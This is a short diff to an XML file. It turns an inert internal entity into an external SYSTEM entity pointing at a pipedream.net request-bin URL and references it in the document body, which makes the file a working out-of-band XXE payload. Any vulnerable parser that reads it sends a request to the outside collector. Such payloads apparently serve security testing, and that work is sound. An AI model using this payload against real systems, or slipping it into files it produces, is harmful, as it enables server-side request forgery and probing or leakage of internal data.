@@ -1,2 +1,6 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE data [<!ENTITY example "https://enr9dd39iwzn.x.pipedream.net/"> ]>
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "https://enr9dd39iwzn.x.pipedream.net/">
+]>
+<data>&file;</data>
